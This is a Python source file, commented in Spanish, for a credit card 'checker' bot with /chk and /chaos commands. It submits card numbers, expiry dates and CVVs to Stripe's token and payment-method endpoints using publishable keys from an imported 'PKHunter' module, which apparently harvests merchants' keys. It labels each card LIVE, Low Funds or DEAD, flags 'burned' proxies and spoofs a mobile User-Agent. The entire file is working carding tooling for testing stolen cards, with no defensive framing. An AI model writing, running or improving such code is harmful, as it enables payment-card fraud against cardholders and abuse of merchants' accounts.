import requests
from pk_hunter import PKHunter

class RiskAnalyzer:
    @staticmethod
    def get_risk_report(response_json):
        # Analiza la salud de la conexión sin alterar el gate
        outcome = response_json.get('outcome', {})
        risk_level = outcome.get('risk_level', 'normal')
        if risk_level == 'highest': return "🔴 RIESGO ALTO (Proxy Quemado)"
        if risk_level == 'elevated': return "🟡 RIESGO MEDIO (IP Sospechosa)"
        return "🟢 RIESGO BAJO (Conexión Limpia)"

class CCChecker:
    """CLASE PARA EL COMANDO /chk (GATE STRIPE REAL)"""
    @staticmethod
    def check_gate_real(cc, mm, yy, cvv):
        pk = PKHunter.get_fresh_pk()
        payload = {
            'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy, 'key': pk
        }
        try:
            r = requests.post('https://api.stripe.com/v1/tokens', data=payload, timeout=15)
            res = r.json()
            res_text = str(res).lower()
            
            # FILTRO DE PRECISIÓN
            if "id" in res and "cvc_check" in res_text and '"cvc_check": "pass"' in res_text:
                return {"status": "LIVE ✅", "msg": "CVC2 Match", "raw": res}
            elif "insufficient_funds" in res_text:
                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
            elif "incorrect_cvc" in res_text or "cvc_check" in res_text:
                return {"status": "LIVE ✅", "msg": "CVC Check Success", "raw": res}
            else:
                err = res.get('error', {}).get('message', 'Declined')
                return {"status": "DEAD ❌", "msg": err, "raw": res}
        except Exception as e:
            return {"status": "ERROR ⚠️", "msg": "Gate Timeout", "raw": {}}

class ChaosGate:
    """CLASE PARA EL COMANDO /chaos (GATE CHAOS V2)"""
    @staticmethod
    def check_chaos(cc, mm, yy, cvv):
        pk = PKHunter.get_fresh_pk()
        headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU OS 16_0 like Mac OS X)'}
        payload = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy, 'key': pk
        }
        try:
            r = requests.post('https://api.stripe.com/v1/payment_methods', data=payload, headers=headers, timeout=15)
            res = r.json()
            res_text = str(res).lower()
            
            # LÓGICA ESPEJO PARA CHAOS
            if 'cvc_check": "pass"' in res_text or '"status": "succeeded"' in res_text:
                return {"status": "LIVE ✅", "msg": "Chaos Success", "raw": res}
            elif "insufficient_funds" in res_text:
                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
            elif any(x in res_text for x in ["funds", "authentication_required"]):
                return {"status": "LIVE ✅", "msg": "Approved (Squeezer)", "raw": res}
            else:
                err = res.get('error', {}).get('message', 'Generic Decline')
                return {"status": "DEAD ❌", "msg": err, "raw": res}
        except Exception as e:
            return {"status": "ERROR ⚠️", "msg": "Chaos Timeout", "raw": {}}
